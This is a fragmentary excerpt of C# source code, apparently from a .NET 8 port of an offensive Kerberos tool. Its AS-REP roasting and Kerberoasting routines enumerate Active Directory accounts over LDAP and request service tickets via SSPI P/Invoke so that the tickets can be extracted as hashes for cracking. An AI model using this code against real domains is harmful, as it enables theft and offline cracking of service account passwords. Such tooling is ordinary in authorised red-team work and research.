    ...
    public class Roast
    {
        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential? cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, string supportedEType = "rc4")
        {
            ...
            else
            {
                ...
                {
                    string samAccountName = GetStringValue(user, "samaccountname");
                    string distinguishedName = GetStringValue(user, "distinguishedname");
                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)GetIntValue(user, "useraccountcontrol");
            ...
            else
            {
                ...
                try
                {
                    ...
                    foreach (IDictionary<string, Object> user in users)
                    {
                        ...
                        // servicePrincipalName is always string[] after the fix in Helpers,
                        // but we stay defensive here too.
                        string servicePrincipalName = GetFirstStringArrayValue(user, "serviceprincipalname");

                        DateTime? pwdLastSet = null;
                        if (user.ContainsKey("pwdlastset") && user["pwdlastset"] != null)
                        {
                            pwdLastSet = GetDateTimeValue(user, "pwdlastset");
                        }

                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                        if (user.ContainsKey("msds-supportedencryptiontypes"))
                        {
                            supportedETypes = (Interop.SUPPORTED_ETYPE)GetIntValue(user, "msds-supportedencryptiontypes");
                        }
                        // ─────────────────────────────────────────────────────────────────
        ...
        // =========================================================================
        // Defensive helper methods for reading LDAP result values safely in .NET 8
        // =========================================================================

        /// <summary>Returns a string value from the dictionary, handling byte[] and other types.</summary>
        ...
        /// <summary>
        /// Returns the first element of a string[] attribute.
        /// Handles the case where the value arrives as a plain string, byte[], or List.
        /// </summary>
        private static string GetFirstStringArrayValue(IDictionary<string, Object> dict, string key)
        {
            if (!dict.ContainsKey(key)) return string.Empty;
            var raw = dict[key];

            if (raw is string[] arr)            return arr.Length > 0 ? arr[0] : string.Empty;
            if (raw is List<object> list)       return list.Count > 0 ? list[0]?.ToString() ?? string.Empty : string.Empty;
            if (raw is string s)                return s;
            if (raw is byte[] b)                return System.Text.Encoding.UTF8.GetString(b);
            return raw?.ToString() ?? string.Empty;
        }

        /// <summary>Returns an int value from the dictionary, handling long, string and byte[] types.</summary>
        private static int GetIntValue(IDictionary<string, Object> dict, string key)
        {
            ...
            if (raw is string s) return int.TryParse(s, out int parsed) ? parsed : 0;
            if (raw is byte[] b && b.Length >= 4) return BitConverter.ToInt32(b, 0);
            try { return Convert.ToInt32(raw); } catch { return 0; }
        }

        /// <summary>
        /// Returns a nullable DateTime from the dictionary.
        /// Handles DateTime, long (FILETIME), string, and byte[] types.
        /// </summary>
        private static DateTime? GetDateTimeValue(IDictionary<string, Object> dict, string key)
        {
            ...
            long fileTime = 0;
            if (raw is long l)        fileTime = l;
            else if (raw is int i)    fileTime = i;
            else if (raw is string s) { if (!long.TryParse(s, out fileTime)) return null; }
            else if (raw is byte[] b && b.Length == 8) fileTime = BitConverter.ToInt64(b, 0);
            else { try { fileTime = Convert.ToInt64(raw); } catch { return null; } }
        ...
        public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential? cred = null, string outFile = "", bool simpleOutput = false)
        {
            ...
            try
            {
                // Build a Kerberos AP-REQ using the native Windows SSPI via Kerberos.NET
                // This replaces the old System.IdentityModel.Tokens.KerberosRequestorSecurityToken
                // which no longer exists in .NET 8.
                byte[] requestBytes = GetKerberosTicketBytes(spn, cred);
        ...
        /// <summary>
        /// Requests a Kerberos AP-REQ token for the given SPN using Windows SSPI directly via P/Invoke.
        /// Replaces System.IdentityModel.Tokens.KerberosRequestorSecurityToken which was removed in .NET 8.
        /// Uses the SSPI structs and P/Invoke signatures already defined in Interop.cs.
        /// </summary>
        private static byte[] GetKerberosTicketBytes(string spn, System.Net.NetworkCredential cred = null)
        {
            const int SEC_E_OK              = 0;
            const int SEC_I_CONTINUE_NEEDED = 0x00090312;
            // SECPKG_CRED_OUTBOUND == 2, matches fCredentialUse (int) in Interop.AcquireCredentialsHandle
            const int SECPKG_CRED_OUTBOUND  = 2;
            // ISC_REQ_CONNECTION == 0x00000800
            const int ISC_REQ_CONNECTION    = (int)Interop.ISC_REQ.CONNECTION;
            // SECURITY_NATIVE_DREP == 16
            const int SECURITY_NATIVE_DREP  = 0x10;

            // Use SECURITY_HANDLE which matches the Interop.cs AcquireCredentialsHandle / InitializeSecurityContext signatures
            var credHandle  = new Interop.SECURITY_HANDLE(0);
            var ctxHandle   = new Interop.SECURITY_HANDLE(0);
            var expiry      = new Interop.SECURITY_INTEGER(0);
            uint contextAttr = 0;

            int status = Interop.AcquireCredentialsHandle(
                null,           // pszPrincipal
                "Kerberos",     // pszPackage
            ...
            if (status != SEC_E_OK)
                throw new System.ComponentModel.Win32Exception(status,
                    $"AcquireCredentialsHandle failed: 0x{status:X8}");

            // SecBufferDesc(int bufferSize) constructor allocates the output buffer internally
            // and GetSecBufferByteArray() extracts the populated token bytes afterwards
            var outputBuffer = new Interop.SecBufferDesc(65536);

            try
            {
                status = Interop.InitializeSecurityContext(
                    ref credHandle,
                    IntPtr.Zero,        // phContext (null = first call)
                    spn,                // pszTargetName
                    ISC_REQ_CONNECTION,
                    0,                  // Reserved1
                    SECURITY_NATIVE_DREP,
                    IntPtr.Zero,        // pInput (null = first call)
                    0,                  // Reserved2
                    out ctxHandle,
                    out outputBuffer,
                    out contextAttr,
                ...
                if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED)
                    throw new System.ComponentModel.Win32Exception(status,
                        $"InitializeSecurityContext failed: 0x{status:X8}");

                byte[] token = outputBuffer.GetSecBufferByteArray();

                Interop.DeleteSecurityContext(ref ctxHandle);
                Interop.FreeCredentialsHandle(ref credHandle);
